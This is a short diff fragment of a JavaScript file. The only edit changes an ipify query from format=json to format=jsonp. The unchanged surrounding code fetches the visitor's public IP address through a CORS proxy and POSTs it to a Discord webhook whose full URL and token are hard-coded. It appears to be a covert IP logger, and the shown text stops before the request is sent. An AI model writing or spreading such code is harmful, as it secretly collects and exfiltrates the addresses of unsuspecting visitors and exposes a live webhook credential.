@@ -11,7 +11,7 @@
     return fetch(url).then(res => res.text());
   }
 
-  text('https://cors-anywhere.herokuapp.com/https://api.ipify.org?format=json').then(data => {
+  text('https://cors-anywhere.herokuapp.com/https://api.ipify.org?format=jsonp').then(data => {
     console.log(JSON.parse(JSON.stringify(data)))
     const request = new XMLHttpRequest();
     request.open("POST", "https://discord.com/api/webhooks/1051249705146921050/89HOeSfP4bPXw6NvS8JaXbrEWCxOksYpvvbeE7GsdD0GQQShEPp4IZO3w4e0QHakm-CP");
